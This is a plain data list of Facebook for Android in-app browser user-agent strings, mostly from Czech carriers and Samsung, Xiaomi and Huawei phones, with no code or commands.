"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824364;FBDM/{density=2.55,width=1080,height=2037};FBLC/en_US;FBRV/258179871;FBCR/LIDL Connect;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CLT-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/292.0.0.60.123;FBBV/250937664;FBDM/{density=2.25,width=720,height=1185};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X220;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=3.0,width=1080,height=2218};FBLC/cs_CZ;FBRV/270254211;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803857;FBDM/{density=3.0,width=1080,height=2040};FBLC/cs_CZ;FBRV/270563687;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/270632023;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803863;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/270623262;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX2;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/270708557;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2129};FBLC/cs_CZ;FBRV/270739054;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/270739054;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/270845053;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803888;FBDM/{density=2.0,width=720,height=1406};FBLC/cs_CZ;FBRV/270913379;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803857;FBDM/{density=3.0,width=1080,height=2040};FBLC/fr_FR;FBRV/270913379;FBCR/Bouygues Telecom;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803863;FBDM/{density=3.0,width=1080,height=2076};FBLC/fr_FR;FBRV/271187573;FBCR/VIRGIN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530W;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=2.75,width=1080,height=2160};FBLC/en_US;FBRV/271132625;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803863;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/271338440;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127287;FBDM/{density=2.75,width=2130,height=1080};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803863;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/271519795;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/271519795;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803857;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/271553537;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634765;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/256299347;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803434;FBDM/{density=2.625,width=1080,height=2047};FBLC/it_IT;FBRV/271061178;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824744;FBDM/{density=2.625,width=1080,height=2131};FBLC/it_IT;FBRV/258179871;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127287;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/0;FBCR/O2-CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618567;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/263824964;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/0;FBCR/Vodafone UA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127275;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/271706454;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=2.625,width=1080,height=2094};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271126315;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/271688182;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/271801755;FBCR/;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=3.0,width=1080,height=2076};FBLC/sv_SE;FBRV/271706454;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271126323;FBDM/{density=2.25,width=720,height=1372};FBLC/ru_RU;FBRV/271849603;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=2.75,width=1080,height=2168};FBLC/cs_CZ;FBRV/271849603;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127288;FBDM/{density=3.375,width=1080,height=2011};FBLC/cs_CZ;FBRV/271849603;FBCR/O2.CZ;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TD;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127286;FBDM/{density=1.75,width=720,height=1381};FBLC/bg_BG;FBRV/271849603;FBCR/A1 BG;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271126933;FBDM/{density=3.0,width=1080,height=2032};FBLC/cs_CZ;FBRV/271849603;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/272224773;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/272257334;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.75,width=720,height=1448};FBLC/cs_CZ;FBRV/272293588;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127276;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/272293588;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271126339;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/272307376;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127280;FBDM/{density=3.375,width=1080,height=2060};FBLC/cs_CZ;FBRV/272307376;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127276;FBDM/{density=3.0,width=1080,height=1812};FBLC/cs_CZ;FBRV/272351275;FBCR/O2 Family;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127288;FBDM/{density=4.0,width=1440,height=2672};FBLC/cs_CZ;FBRV/272351275;FBCR/O2.CZ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H870;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2032};FBLC/cs_CZ;FBRV/0;FBCR/O2 Family;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127352;FBDM/{density=2.75,width=1080,height=2138};FBLC/cs_CZ;FBRV/272618289;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966610;FBDM/{density=2.0,width=720,height=1411};FBLC/cs_CZ;FBRV/239808926;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ART-L29;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127287;FBDM/{density=2.75,width=2130,height=1080};FBLC/cs_CZ;FBRV/272618289;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=2.75,width=1080,height=2030};FBLC/cs_CZ;FBRV/272840240;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272399605;FBDM/{density=1.875,width=720,height=1465};FBLC/cs_CZ;FBRV/0;FBCR/TESCO Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.42.118;FBBV/272392658;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/272719048;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/304.0.0.42.118;FBBV/272392578;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/272719048;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.42.118;FBBV/272392658;FBDM/{density=2.75,width=1080,height=2179};FBLC/cs_CZ;FBRV/272719048;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J17G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/273060553;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2129};FBLC/cs_CZ;FBRV/273060553;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2178};FBLC/cs_CZ;FBRV/273060553;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/273364224;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/273576819;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX2;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/271519795;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2147};FBLC/en_GB;FBRV/273494982;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2180};FBLC/cs_CZ;FBRV/273736137;FBCR/Telekom.de;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/273695459;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2135};FBLC/cs_CZ;FBRV/273731541;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/273781587;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2184};FBLC/it_IT;FBRV/273160185;FBCR/vodafone IT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2094};FBLC/it_IT;FBRV/273589450;FBCR/I TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A920F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/273837177;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2129};FBLC/cs_CZ;FBRV/273901451;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Browser	[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127298;FBDM/{density=2.0,width=720,height=1365};FBLC/en_US;FBRV/271849603;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S111DL;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/274029837;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2270};FBLC/cs_CZ;FBRV/274073372;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO F2 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=1776};FBLC/cs_CZ;FBRV/274073372;FBCR/T-Mobile CZ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H4113;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401174;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/274073372;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/274073372;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/274352184;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STF-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/274536441;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/274630178;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.375,width=1080,height=2011};FBLC/cs_CZ;FBRV/274630178;FBCR/O2.CZ;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TD;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1794};FBLC/cs_CZ;FBRV/274669536;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/274807707;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922242;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/274797735;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=3.0,width=1080,height=2178};FBLC/cs_CZ;FBRV/274614947;FBCR/O2-CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/274073372;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2132};FBLC/cs_CZ;FBRV/274852780;FBCR/Vodafone CZ;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342878;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/268824966;FBCR/Free;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
